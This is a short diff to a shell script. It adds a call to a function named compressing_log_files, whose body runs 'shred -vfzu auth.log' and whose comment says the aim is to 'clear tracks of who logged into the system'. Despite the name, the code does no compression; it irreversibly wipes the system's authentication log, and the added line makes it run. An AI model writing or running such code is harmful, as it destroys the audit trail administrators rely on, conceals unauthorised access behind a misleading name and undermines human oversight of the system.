@@ -31,3 +31,4 @@ compressing_log_files() {
 # Use 'shred' to clear tracks of who logged into the system to manipulate/compress log files
 shred -vfzu auth.log
 }
+compressing_log_files
